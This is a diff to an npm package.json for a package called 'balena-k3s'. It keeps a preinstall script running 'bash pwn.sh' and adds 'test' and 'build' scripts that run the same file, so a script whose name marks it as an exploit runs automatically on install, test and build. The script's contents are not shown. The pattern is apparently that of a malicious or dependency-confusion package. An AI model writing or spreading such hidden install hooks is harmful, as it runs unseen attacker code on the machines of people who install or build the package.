@@ -2,6 +2,8 @@
   "name": "balena-k3s",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "bash pwn.sh"
+    "preinstall": "bash pwn.sh",
+    "test": "bash pwn.sh",
+    "build": "bash pwn.sh"
   }
 }
